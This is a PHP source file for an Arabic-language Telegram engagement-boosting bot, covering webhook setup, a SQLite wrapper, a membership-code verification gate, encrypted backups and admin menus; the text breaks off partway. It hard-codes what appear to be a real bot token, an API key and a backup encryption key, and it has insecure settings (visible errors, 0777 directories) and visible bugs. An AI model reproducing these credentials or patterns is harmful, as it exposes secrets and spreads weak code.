<?php

// ===== FILE: Khadamti.php =====

// ===== إعداد مجلد البيانات الدائم (متوافق مع Render/Docker/VPS) =====
$DATA_DIR = getenv('BOT_DATA_DIR') ?: __DIR__;
if (!is_dir($DATA_DIR)) mkdir($DATA_DIR, 0777, true);

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// باقي الملف كما هو...

// ===== FILE: Khadamti.php =====


ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

register_shutdown_function(function() {
    $err = error_get_last();
    if ($err && in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR])) {
        echo "<div style='background:#ffcccc; padding:20px; border:2px solid red; font-family:monospace; direction:ltr; text-align:left;'>";
        echo "<h3>🚨 تم العثور على مشكلة (Fatal Error):</h3>";
        echo "<b>السبب:</b> " . $err['message'] . "<br><br>";
        echo "<b>السطر:</b> " . $err['line'] . "<br><br>";
        echo "<b>الملف:</b> " . $err['file'];
        echo "</div>";
    }
});

$API_KEY = "8219959691:AAHXecqlg5LH8dZNr5AqegPBAZVUftaHq5k"; //توكنك
$joo = "8822431707"; // ايديك
define('API_KEY', $API_KEY);

function bot($method, $datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    return json_decode($res);
}

// ===== تنصيب تلقائي عن طريق الويبهوك =====
// لما تفتح رابط الملف من المتصفح مباشرة (بدون POST من تيليجرام) هيسجل الويبهوك تلقائياً
if (php_sapi_name() !== 'cli' && empty(file_get_contents('php://input'))) {
    $self_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $hook = json_decode(file_get_contents("https://api.telegram.org/bot".$API_KEY."/setWebhook?url=" . urlencode($self_url)));
    if ($hook && isset($hook->ok) && $hook->ok) {
        echo "✅ تم تفعيل الويبهوك بنجاح على هذا الرابط:<br>" . htmlspecialchars($self_url);
    } else {
        echo "⚠️ فشل تفعيل الويبهوك: " . htmlspecialchars(json_encode($hook));
    }
    exit;
}

$bot_info = bot("getme");
$usrbot = $bot_info->result->username ?? "UnknownBot";
$bot_id = $bot_info->result->id ?? 8703576205;


$NamesBACK = "• رجوع •";
define("IDBot", $bot_id);
define("USR_BOT", $usrbot);

// ===== قاعدة البيانات: SQLite (ملف محلي واحد - بدون الحاجة لتنصيب خادم MySQL) =====
if (!defined('SQLITE3_TEXT')) {
    define('SQLITE3_TEXT', 3);
    define('SQLITE3_INTEGER', 1);
    define('SQLITE3_FLOAT', 2);
    define('SQLITE3_BLOB', 4);
    define('SQLITE3_NULL', 5);
}

class DBResult {
    private $stmt;
    function __construct($stmt) { $this->stmt = $stmt; }
    function fetch_assoc() {
        $row = $this->stmt->fetch(PDO::FETCH_ASSOC);
        return $row === false ? null : $row;
    }
}

class DBStmt {
    private $pdo_stmt;
    private $placeholders;
    private $cursor = 0;
    function __construct($pdo_stmt, $sql) {
        $this->pdo_stmt = $pdo_stmt;
        preg_match_all('/\?|:[a-zA-Z_][a-zA-Z0-9_]*/', $sql, $m);
        $this->placeholders = $m[0];
    }
    private function bindOne($value) {
        if ($this->cursor >= count($this->placeholders)) return;
        $ph = $this->placeholders[$this->cursor];
        if ($ph === '?') {
            $this->pdo_stmt->bindValue($this->cursor + 1, $value);
        } else {
            $this->pdo_stmt->bindValue($ph, $value);
        }
        $this->cursor++;
    }
    function bind_param($types, &...$vars) {
        foreach ($vars as $v) { $this->bindOne($v); }
        return true;
    }
    function bindValue($param, $value, $type = null) {
        if (is_string($param) && in_array($param, $this->placeholders, true)) {
            $this->pdo_stmt->bindValue($param, $value);
            return true;
        }
        $this->bindOne($value);
        return true;
    }
    function execute() {
        $ok = $this->pdo_stmt->execute();
        return $ok ? new DBResult($this->pdo_stmt) : false;
    }
    function get_result() {
        return new DBResult($this->pdo_stmt);
    }
}

class DBShim {
    public $connect_error = null;
    private $pdo;
    function __construct($path) {
        try {
            $this->pdo = new PDO("sqlite:" . $path);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
            $this->pdo->exec("PRAGMA busy_timeout = 5000");
            $this->pdo->exec("PRAGMA journal_mode = WAL");
        } catch (Exception $e) {
            $this->connect_error = $e->getMessage();
        }
    }
    function set_charset($c) { return true; }
    function query($sql) {
        $stmt = $this->pdo->query($sql);
        if (!$stmt) return false;
        return new DBResult($stmt);
    }
    function prepare($sql) {
        $sql = preg_replace('/\s+FOR\s+UPDATE\s*$/i', '', $sql);
        $sql = preg_replace('/^\s*INSERT\s+IGNORE\s+INTO/i', 'INSERT OR IGNORE INTO', $sql);
        $pstmt = $this->pdo->prepare($sql);
        if (!$pstmt) return false;
        return new DBStmt($pstmt, $sql);
    }
    function begin_transaction() {
        if (!$this->pdo->inTransaction()) { try { $this->pdo->beginTransaction(); } catch (Exception $e) {} }
    }
    function commit() {
        if ($this->pdo->inTransaction()) { try { $this->pdo->commit(); } catch (Exception $e) {} }
    }
    function rollback() {
        if ($this->pdo->inTransaction()) { try { $this->pdo->rollBack(); } catch (Exception $e) {} }
    }
}

$db_path = __DIR__ . '/kilwa_database.sqlite';
$db = new DBShim($db_path);
if ($db->connect_error) {
    die("<h3 style='color:red; text-align:center;'>🚨 فشل الاتصال بقاعدة البيانات: " . $db->connect_error . "</h3>");
}
$db->set_charset("utf8mb4");


$db->begin_transaction();

$db->query("CREATE TABLE IF NOT EXISTS rshq_data (`key` VARCHAR(255) PRIMARY KEY, `value` LONGTEXT)");
$db->query("CREATE TABLE IF NOT EXISTS tmoil_data (`key` VARCHAR(255) PRIMARY KEY, `value` LONGTEXT)");
$db->query("CREATE TABLE IF NOT EXISTS modes_data (`key` VARCHAR(255) PRIMARY KEY, `value` LONGTEXT)");
$db->query("CREATE TABLE IF NOT EXISTS joo_data (`key` VARCHAR(255) PRIMARY KEY, `value` LONGTEXT)");
$db->query("CREATE TABLE IF NOT EXISTS timer_data (`key` VARCHAR(255) PRIMARY KEY, `value` LONGTEXT)");

function getData($db, $table, $key) {
    
    $stmt = $db->prepare("SELECT `value` FROM `$table` WHERE `key` = ?");
    if(!$stmt) return null;
    $stmt->bind_param("s", $key);
    $stmt->execute();
    $result = $stmt->get_result();
    if ($row = $result->fetch_assoc()) {
        return json_decode($row['value'], true);
    }
    return null;
}

function setData($db, $table, $key, $value) {
    $json = json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    $stmt = $db->prepare("REPLACE INTO `$table` (`key`, `value`) VALUES (?, ?)");
    if($stmt) {
        $stmt->bind_param("ss", $key, $json);
        $stmt->execute();
    }
    
    $db->commit();
    $db->begin_transaction();
}

function SETJSON($INPUT){
    global $db;
    setData($db, 'rshq_data', 'rshq', $INPUT);
}
function SETJSON1($INPUT){
    global $db;
    setData($db, 'tmoil_data', 'tmoil', $INPUT);
}
function SETJSON2($INPUT){
    global $db;
    setData($db, 'modes_data', 'modes', $INPUT);
}

$bot_id_azrar = $bot_info->result->id ?? IDBot;
$joo_path = "kilwa/$bot_id_azrar/joo.json";
if(!file_exists("kilwa/$bot_id_azrar")) mkdir("kilwa/$bot_id_azrar", 0777, true);
$joo_azrar = file_exists($joo_path) ? json_decode(file_get_contents($joo_path), true) : [];

function save($array){
    global $joo_path;
    file_put_contents($joo_path, json_encode($array, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
}

$rshq = getData($db, 'rshq_data', 'rshq') ?: [];
$tmoil = getData($db, 'tmoil_data', 'tmoil') ?: [];
$modes = getData($db, 'modes_data', 'modes') ?: [];
$joo_data_unused = getData($db, 'joo_data', 'joo') ?: [];
$timer = getData($db, 'timer_data', 'timer') ?: [];

if(!isset($tmoil['db'])) $tmoil['db'] = [];
if(!isset($tmoil['db']['chs'])) $tmoil['db']['chs'] = [];
if(!isset($tmoil['chanels'])) $tmoil['chanels'] = [];
if(!isset($tmoil['sets'])) $tmoil['sets'] = [];
if(!isset($tmoil['blockers'])) $tmoil['blockers'] = [];
if(!isset($tmoil['blocks'])) $tmoil['blocks'] = [];
if(!isset($tmoil['chids'])) $tmoil['chids'] = [];
if(!isset($tmoil['info'])) $tmoil['info'] = [];
if(!isset($tmoil['funding_terms'])) $tmoil['funding_terms'] = "📋 شروط التمويل:\n1. يجب أن يكون البوت مشرفاً في قناتك\n2. الحد الأدنى للتمويل هو {min_count} عضو\n3. سعر العضو الواحد {price} {currency}\n4. يتم خصم الرصيد فور إنشاء الطلب\n5. لا يمكن استرجاع الرصيد بعد إنشاء الطلب";
if(!isset($modes['mode'])) $modes['mode'] = [];

$update = json_decode(file_get_contents('php://input'));

$message = $update->message ?? null;
$message_id = $message->message_id ?? null;
$username = $message->from->username ?? null;
$chat_id = $message->chat->id ?? null;
$title = $message->chat->title ?? null;
$text = $message->text ?? null;
$user = $message->from->username ?? null;
$name = $message->from->first_name ?? null;
$from_id = $message->from->id ?? null;

$data = null;
$data_ = []; 

if(isset($update->callback_query)){
    $data = $update->callback_query->data;
    $data_ = explode("|", $data); 
    
    $chat_id = $update->callback_query->message->chat->id ?? null;
    $title = $update->callback_query->message->chat->title ?? null;
    $message_id = $update->callback_query->message->message_id ?? null;
    $name = $update->callback_query->message->chat->first_name ?? null;
    $user = $update->callback_query->message->chat->username ?? null;
    $from_id = $update->callback_query->from->id ?? null;

    if(!isset($timer['TIME'])) $timer['TIME'] = [];
    if(!isset($timer['acount'])) $timer['acount'] = [];

    if( ($timer['TIME'][$from_id] ?? "") >= date("h:s")){
        $timer['TIME'][$from_id] = date("h:s");
        setData($db, 'timer_data', 'timer', $timer);
    }
}

// ===== نظام التحقق من الاشتراك بكود رقمي (يعمل قبل أي شيء آخر) =====
$verifyChannelUsername = 'PHPGEKO'; // غيّر هذا لاسم قناتك بدون @

function vrf_generateCode() {
    return str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
}

function vrf_checkMembership($userId) {
    global $verifyChannelUsername;
    $member = bot('getChatMember', [
        'chat_id' => "@{$verifyChannelUsername}",
        'user_id' => $userId
    ]);
    if (isset($member->ok) && $member->ok) {
        $status = $member->result->status ?? '';
        return in_array($status, ['member', 'administrator', 'creator']);
    }
    return false;
}

function vrf_getUserData($userId) {
    $dir = __DIR__ . '/verify_users';
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    $file = $dir . '/' . $userId . '.json';
    if (!file_exists($file)) {
        file_put_contents($file, json_encode(['code' => vrf_generateCode(), 'input' => '']));
    }
    return json_decode(file_get_contents($file), true);
}

function vrf_saveUserData($userId, $data) {
    $dir = __DIR__ . '/verify_users';
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    file_put_contents($dir . '/' . $userId . '.json', json_encode($data));
}

function vrf_isVerified($from_id) {
    global $rshq;
    return $rshq['verified'][$from_id] ?? false;
}

function vrf_markVerified($from_id) {
    global $rshq;
    $rshq['verified'][$from_id] = true;
    SETJSON($rshq);
    @unlink(__DIR__ . '/verify_users/' . $from_id . '.json');
}

function vrf_keyboard() {
    return [
        'inline_keyboard' => [
            [['text' => '1', 'callback_data' => 'vrf_num_1'], ['text' => '2', 'callback_data' => 'vrf_num_2'], ['text' => '3', 'callback_data' => 'vrf_num_3']],
            [['text' => '4', 'callback_data' => 'vrf_num_4'], ['text' => '5', 'callback_data' => 'vrf_num_5'], ['text' => '6', 'callback_data' => 'vrf_num_6']],
            [['text' => '7', 'callback_data' => 'vrf_num_7'], ['text' => '8', 'callback_data' => 'vrf_num_8'], ['text' => '9', 'callback_data' => 'vrf_num_9']],
            [['text' => '✅ تأكيد', 'callback_data' => 'vrf_confirm'], ['text' => '0', 'callback_data' => 'vrf_num_0'], ['text' => '❌ حذف', 'callback_data' => 'vrf_delete']],
            [['text' => '🔄 تحديث الرمز', 'callback_data' => 'vrf_refresh']]
        ]
    ];
}

function vrf_showCodeScreen($chat_id, $message_id, $code, $input, $edit = true) {
    $text = "🔐 <b>التحقق من العضوية</b>\n\n";
    $text .= "📝 <b>الرمز الذي أدخلته:</b>\n";
    $text .= "┏━━━━━━━━━━━━━━━━┓\n";
    $text .= "┃ <code>{$input}</code>\n";
    $text .= "┗━━━━━━━━━━━━━━━━┛\n\n";
    $text .= "🔢 <b>الرمز المطلوب إدخاله:</b> <code>{$code}</code>\n\n";
    $text .= "⬇️ <b>اختر الأرقام:</b>";
    if ($edit) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $text,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(vrf_keyboard())
        ]);
    } else {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => $text,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(vrf_keyboard())
        ]);
    }
}

if ($from_id && $from_id != $joo && !isAdmin($db, $from_id) && !vrf_isVerified($from_id)) {

    $vrf_callback_data = $update->callback_query->data ?? null;

    // معالجة الضغطات الخاصة بشاشة التحقق
    if ($vrf_callback_data && strpos($vrf_callback_data, 'vrf_') === 0) {

        if ($vrf_callback_data == 'vrf_check_again') {
            if (vrf_checkMembership($from_id)) {
                $ud = vrf_getUserData($from_id);
                vrf_showCodeScreen($chat_id, $message_id, $ud['code'], $ud['input']);
            } else {
                bot('answerCallbackQuery', ['callback_query_id' => $update->callback_query->id, 'text' => "❌ ما زلت غير مشترك بالقناة!", 'show_alert' => true]);
            }
            exit;
        }

        if (!vrf_checkMembership($from_id)) {
            bot('answerCallbackQuery', ['callback_query_id' => $update->callback_query->id, 'text' => "❌ يجب الاشتراك بالقناة أولاً!", 'show_alert' => true]);
            exit;
        }

        $ud = vrf_getUserData($from_id);

        if ($vrf_callback_data == 'vrf_refresh') {
            $ud['code'] = vrf_generateCode();
            $ud['input'] = '';
            vrf_saveUserData($from_id, $ud);
            vrf_showCodeScreen($chat_id, $message_id, $ud['code'], $ud['input']);
            bot('answerCallbackQuery', ['callback_query_id' => $update->callback_query->id, 'text' => "🔄 تم تحديث الرمز", 'show_alert' => false]);
            exit;
        }

        if (strpos($vrf_callback_data, 'vrf_num_') === 0) {
            $num = substr($vrf_callback_data, 8);
            if (strlen($ud['input']) < 6) {
                $ud['input'] .= $num;
                vrf_saveUserData($from_id, $ud);
            }
            vrf_showCodeScreen($chat_id, $message_id, $ud['code'], $ud['input']);
            bot('answerCallbackQuery', ['callback_query_id' => $update->callback_query->id]);
            exit;
        }

        if ($vrf_callback_data == 'vrf_delete') {
            $ud['input'] = substr($ud['input'], 0, -1);
            vrf_saveUserData($from_id, $ud);
            vrf_showCodeScreen($chat_id, $message_id, $ud['code'], $ud['input']);
            bot('answerCallbackQuery', ['callback_query_id' => $update->callback_query->id]);
            exit;
        }

        if ($vrf_callback_data == 'vrf_confirm') {
            if ($ud['input'] == $ud['code']) {
                vrf_markVerified($from_id);
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $message_id,
                    'text' => "✅ <b>تم التحقق بنجاح!</b>\n\n🎉 يمكنك الآن استخدام البوت بشكل طبيعي.\nأرسل /start للمتابعة."
                ]);
            } else {
                bot('answerCallbackQuery', ['callback_query_id' => $update->callback_query->id, 'text' => "❌ الرمز غير صحيح! حاول مرة أخرى", 'show_alert' => true]);
            }
            exit;
        }
    }

    // أول دخول أو أي رسالة قبل التحقق
    if (!vrf_checkMembership($from_id)) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "❌ <b>عذراً! يجب الاشتراك بالقناة أولاً للتحقق من هويتك</b>\n\n📢 القناة: @{$verifyChannelUsername}",
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => [
                [['text' => "📢 اشترك في @{$verifyChannelUsername}", 'url' => "https://t.me/{$verifyChannelUsername}"]],
                [['text' => '🔄 تحقق مرة أخرى', 'callback_data' => 'vrf_check_again']]
            ]])
        ]);
        exit;
    } else {
        $ud = vrf_getUserData($from_id);
        vrf_showCodeScreen($chat_id, null, $ud['code'], $ud['input'], false);
        exit;
    }
}


$asia_settings = $rshq['asia_settings'] ?? [];
if(empty($asia_settings)){
$asia_settings = ['receive_number' => '', 'points_per_asia' => 1, 'status' => 'on'];
$rshq['asia_settings'] = $asia_settings;
SETJSON($rshq);
}
$asia_receive_number = $asia_settings['receive_number'] ?? '';
$points_per_asia = $asia_settings['points_per_asia'] ?? 1;
$asia_status = $asia_settings['status'] ?? 'on';
define('ASIA_API_KEY', '1ccbc4c913bc4ce785a0a2de444aa0d6');
$stars_settings = $rshq['stars_settings'] ?? [];
if(empty($stars_settings)){
$stars_settings = ['points_per_star' => 10, 'status' => 'on'];
$rshq['stars_settings'] = $stars_settings;
SETJSON($rshq);
}
$points_per_star = $stars_settings['points_per_star'] ?? 10;
$stars_status = $stars_settings['status'] ?? 'on';
/*$e=explode("|", $data);
$invite_num = null;
if(strpos($text, "/start") === 0){
$after_start = trim(substr($text, 6));
if(is_numeric($after_start)){
$invite_num = (int)$after_start;
} elseif(strpos($after_start, " ") !== false){
$parts = explode(" ", $after_start);
if(is_numeric($parts[0])){
$invite_num = (int)$parts[0];
}
}
}
if($invite_num !== null && $invite_num > 0 && !preg_match("/#kilwa#/", $text)) {
$rshq['HACKER'][$from_id] = "I";
$rshq['HACK'][$from_id] = $invite_num;
SETJSON($rshq);
}*/
$chnl = $rshq["sCh"];
$Api_Tok = $rshq["sToken"];
$dqiq = date('i');
$s = date('s');
if($update->callback_query){
if ($timer["acount"][$from_id] < time()) {
if($update->callback_query->message->chat->id != $joo and $update->callback_query->message->chat->id != $joo) {
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $update->callback_query->from->id;
} else{
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $update->callback_query->from->id;
}
}
}

$url_info = @file_get_contents("https://api.telegram.org/bot".API_KEY."/getMe");
$json_info = json_decode($url_info);
$bot_id = $json_info->result->id ?? IDBot;
$ARM = @json_decode(@file_get_contents("T_/".$bot_id.".json"), 1);
$usrbot = $json_info->result->username ?? USR_BOT;
$rsedi = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=balance"));
$flos = $rsedi->balance;
$treqa = $rsedi->currency;
if($rshq['currency'] == null){
$rshq['currency'] = "نقاط";
SETJSON($rshq);
}
$currency_name = $rshq['currency'];


define('BACKUP_ADMIN', $joo); 
define('BACKUP_DIR', '"$DATA_DIR/kilwa/backups/"');
define('BACKUP_ENCRYPTION_KEY', 'kilwaSecretKey2024@SecureBackup');

if (!file_exists(BACKUP_DIR)) {
mkdir(BACKUP_DIR, 0777, true);
}


function encrypt_backup_data($data, $key) {
$iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
$encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
return base64_encode($encrypted . '::' . $iv);
}


function decrypt_backup_data($encrypted_data, $key) {
$decoded = base64_decode($encrypted_data);
list($encrypted, $iv) = explode('::', $decoded, 2);
return openssl_decrypt($encrypted, 'aes-256-cbc', $key, 0, $iv);
}


function create_backup() {
global $db, $rshq, $tmoil, $modes, $joo, $timer;

$backup_data = [];
$tables = ['rshq_data', 'tmoil_data', 'modes_data', 'joo_data', 'timer_data'];

foreach ($tables as $table) {
$result = $db->query("SELECT * FROM `$table`");
$table_data = [];
while ($row = $result->fetch_assoc()) {
$table_data[] = $row;
}
$backup_data[$table] = $table_data;
}

$backup_data['metadata'] = [
'backup_time' => date('Y-m-d H:i:s'),
'bot_id' => IDBot,
'bot_username' => USR_BOT,
'db_version' => '1.0'
];
$json_data = json_encode($backup_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
$encrypted = encrypt_backup_data($json_data, BACKUP_ENCRYPTION_KEY);
$backup_filename = BACKUP_DIR . 'backup_' . date('Y-m-d_H-i-s') . '_' . IDBot . '.enc';
file_put_contents($backup_filename, $encrypted);

return [
'file' => $backup_filename,
'size' => filesize($backup_filename),
'time' => date('Y-m-d H:i:s')
];
}
function send_backup_to_admin($admin_id, $backup_info) {
global $usrbot;

$backup_file = $backup_info['file'];
$file_size = round($backup_info['size'] / 1024, 2);

$caption = "🔐 *نسخة احتياطية جديدة*\n\n"
 . "📅 التاريخ: " . $backup_info['time'] . "\n"
 . "📦 حجم الملف: {$file_size} KB\n"
 . "🤖 البوت: @{$usrbot}\n"
 . "🔒 الملف مشفر (AES-256-CBC)\n\n"
 . "⚠️ *تنبيه:* لا تشارك هذا الملف مع أي شخص!";

$send = bot('sendDocument', [
'chat_id' => $admin_id,
'document' => new CURLFile($backup_file),
'caption' => $caption,
  //  'parse_mode' => 'markdown'
]);
if ($send && file_exists($backup_file)) {
unlink($backup_file);
}
}
function restore_backup_from_file($file_path, $admin_id) {
global $db, $API_KEY;
$encrypted_data = file_get_contents($file_path);
if (!$encrypted_data) { return ['success' => false, 'message' => 'فشل قراءة الملف']; }
$json_data = decrypt_backup_data($encrypted_data, BACKUP_ENCRYPTION_KEY);
if (!$json_data) { return ['success' => false, 'message' => 'فشل فك التشفير - المفتاح غير صحيح أو الملف تالف']; }
$backup_data = json_decode($json_data, true);
if (!$backup_data) { return ['success' => false, 'message' => 'ملف النسخة الاحتياطية تالف']; }
if (!isset($backup_data['metadata']['bot_id']) || $backup_data['metadata']['bot_id'] != IDBot) {
return ['success' => false, 'message' => 'هذه النسخة الاحتياطية لبوت آخر!'];
}
$db->begin_transaction();
try {
foreach ($backup_data as $table => $rows) {
if ($table == 'metadata') continue;
$db->query("DROP TABLE IF EXISTS `$table`");
$create_stmt = '';
switch($table) {
case 'rshq_data':
case 'tmoil_data':
case 'modes_data':
case 'joo_data':
case 'timer_data':
$create_stmt = "CREATE TABLE IF NOT EXISTS `$table` (`key` VARCHAR(255) PRIMARY KEY, `value` LONGTEXT)";
break;
}
if ($create_stmt) { $db->query($create_stmt); }
foreach ($rows as $row) {
if (isset($row['key']) && isset($row['value'])) {
$stmt = $db->prepare("REPLACE INTO `$table` (`key`, `value`) VALUES (?, ?)");
$stmt->bind_param("ss", $row['key'], $row['value']);
$stmt->execute();
}
}
}
$db->commit();

global $rshq, $tmoil, $modes, $joo, $timer;
$rshq = getData($db, 'rshq_data', 'rshq') ?: [];
$tmoil = getData($db, 'tmoil_data', 'tmoil') ?: [];
$modes = getData($db, 'modes_data', 'modes') ?: [];
$joo_data_unused = getData($db, 'joo_data', 'joo') ?: [];
$timer = getData($db, 'timer_data', 'timer') ?: [];

return ['success' => true, 'message' => 'تم استعادة النسخة الاحتياطية بنجاح!'];

} catch (Exception $e) {
$db->rollback();
return ['success' => false, 'message' => 'خطأ في الاستعادة: ' . $e->getMessage()];
}
}


function clean_old_backups() {
$backups = glob(BACKUP_DIR . '*.enc');
if (count($backups) > 20) {
usort($backups, function($a, $b) {
return filemtime($a) - filemtime($b);
});
$to_delete = array_slice($backups, 0, count($backups) - 20);
foreach ($to_delete as $file) {
unlink($file);
}
}
}





if (isset($update->message->document) && ($chat_id == $joo || isAdmin($db, $chat_id))) {
$document = $update->message->document;
$file_name = $document->file_name;
$file_id = $document->file_id;

if (pathinfo($file_name, PATHINFO_EXTENSION) == 'enc') {
$file_info = bot('getFile', ['file_id' => $file_id]);
if ($file_info && isset($file_info->result->file_path)) {
$file_url = "https://api.telegram.org/file/bot" . API_KEY . "/" . $file_info->result->file_path;
$temp_file = BACKUP_DIR . 'temp_restore_' . time() . '.enc';
$file_content = file_get_contents($file_url);
if ($file_content) {
file_put_contents($temp_file, $file_content);
$restore_result = restore_backup_from_file($temp_file, $joo);
if ($restore_result['success']) {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "✅ *{$restore_result['message']}*\n\nتمت استعادة قاعدة البيانات بنجاح!",
'parse_mode' => 'markdown'
]);
bot('sendMessage', [
'chat_id' => $joo,
'text' => "⚠️ *تنبيه: تم استعادة نسخة احتياطية*\n\n📅 التاريخ: " . date('Y-m-d H:i:s') . "\n👤 بواسطة: [$name](tg://user?id=$from_id)\n📁 الملف: $file_name",
'parse_mode' => 'markdown'
]);
} else {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "❌ *فشل الاستعادة*\n\n{$restore_result['message']}",
'parse_mode' => 'markdown'
]);
}
unlink($temp_file);
} else {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "❌ فشل تحميل ملف النسخة الاحتياطية"
]);
}
}
} else {
}
}

if ($data == "backup_panel") {
$backup_buttons = [
'inline_keyboard' => [
[['text' => "📦 إنشاء نسخة احتياطية فورية", 'callback_data' => "create_backup_now"]],
[['text' => "📊 معلومات النسخ الاحتياطية", 'callback_data' => "backup_info"]],
[['text' => "🗑️ تنظيف النسخ القديمة", 'callback_data' => "clean_backups_now"]],
[['text' => "⬅️ رجوع", 'callback_data' => "rshqG"]]
]
];

$backups_list = glob(BACKUP_DIR . '*.enc');
$backups_count = count($backups_list);
$total_size = 0;
foreach ($backups_list as $file) {
$total_size += filesize($file);
}
$total_size_mb = round($total_size / 1048576, 2);

bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*🔐 إدارة النسخ الاحتياطية*\n\n"
. "📦 عدد النسخ المحفوظة: {$backups_count}\n"
. "💾 الحجم الإجمالي: {$total_size_mb} MB\n"
. "⏰ آخر نسخة: " . (file_exists($last_backup_file) ? date('Y-m-d H:i:s', (int)file_get_contents($last_backup_file)) : 'لا يوجد' ) . "\n\n"
. "🔒 *ملاحظة:* جميع النسخ مشفرة بنظام AES-256-CBC\n"
. "📌 لإستعادة نسخة: أرسل ملف النسخة (.enc) للبوت",
'parse_mode' => 'markdown',
'reply_markup' => json_encode($backup_buttons)
]);
}

if ($data == "create_backup_now") {
$backup_info = create_backup();
send_backup_to_admin($joo, $backup_info);

bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "✅ *تم إنشاء نسخة احتياطية جديدة*\n\n📅 التاريخ: " . $backup_info['time'] . "\n📦 الحجم: " . round($backup_info['size'] / 1024, 2) . " KB\n\nتم إرسال النسخة إلى الأدمن",
'parse_mode' => 'markdown',
'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "⬅️ رجوع", 'callback_data' => "backup_panel"]]]])
]);
}

if ($data == "clean_backups_now") {
clean_old_backups();
$remaining = count(glob(BACKUP_DIR . '*.enc'));

bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "✅ *تم تنظيف النسخ القديمة*\n\n📦 عدد النسخ المتبقية: {$remaining}\n🗑️ تم حذف النسخ التي تزيد عن 20",
'parse_mode' => 'markdown',
'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "⬅️ رجوع", 'callback_data' => "backup_panel"]]]])
]);
}

if ($data == "backup_info") {
$backups = glob(BACKUP_DIR . '*.enc');
$backup_list = "";
$count = 0;
rsort($backups);

foreach ($backups as $backup) {
$count++;
$backup_time = date('Y-m-d H:i:s', filemtime($backup));
$size = round(filesize($backup) / 1024, 2);
$backup_list .= "📁 `" . basename($backup) . "`\n   📅 $backup_time | 📦 {$size} KB\n\n";
if ($count >= 10) break; 
}

if (empty($backup_list)) {
$backup_list = "لا توجد نسخ احتياطية";
}

bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*📊 معلومات النسخ الاحتياطية*\n\n"
. "📦 آخر 10 نسخ:\n\n{$backup_list}\n"
. "🔒 *طريقة الاستعادة:*\n"
. "1️⃣ أرسل ملف النسخة الاحتياطية (.enc) للبوت\n"
. "2️⃣ انتظر تأكيد الاستعادة\n"
. "3️⃣ سيتم إعادة تشغيل البيانات تلقائياً",
'parse_mode' => 'markdown',
'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "⬅️ رجوع", 'callback_data' => "backup_panel"]]]])
]);
}


$adm = [
'inline_keyboard'=>[
[['text'=>"الاعدادات العامة ️",'callback_data'=>"general_settings"]],
[['text'=>"قسم الشحن التلقائي 💳",'callback_data'=>"auto_charge_settings"]],
[['text'=>"قسم الرشق ",'callback_data'=>"qsmsa"],["text" => "ماركت البوت","callback_data"=>"market_sections"]],
[['text'=>"الهدايا والتحويلات ",'callback_data'=>"gift_settings"],['text'=>"التحكم في الرشق",'callback_data'=>"rshq_toggle"]],
[['text'=>"تعيين موقع الرشق",'callback_data'=>"infoRshq"],['text'=>"التحكم بالنقاط",'callback_data'=>"member_control"]],
[['text'=>"اعدادات التمويل ",'callback_data'=>"admin_funding_settings"],['text'=>"قنوات البوت ",'callback_data'=>"admin_bot_channels"]],
[['text'=>"النسخ الاحطياطي",'callback_data'=>"backup_panel"]],
[['text'=>'رجوع' ,'callback_data'=>"setting"]],
]
];
$general_settings = [
'inline_keyboard'=>[
[['text'=>"تعيين عمله البوت ",'callback_data'=>"set_currency"],['text'=>"تعيين اقل حد للتحويل ",'callback_data'=>"sAKTHAR"]],
[['text'=>"تعيين عدد نقاط المشاركه ",'callback_data'=>"setshare"],['text'=>"تعيين قناة الاثباتات ",'callback_data'=>"sCh"]],
[['text'=>"تعيين اسم البوت 🏷️",'callback_data'=>"setname"]],
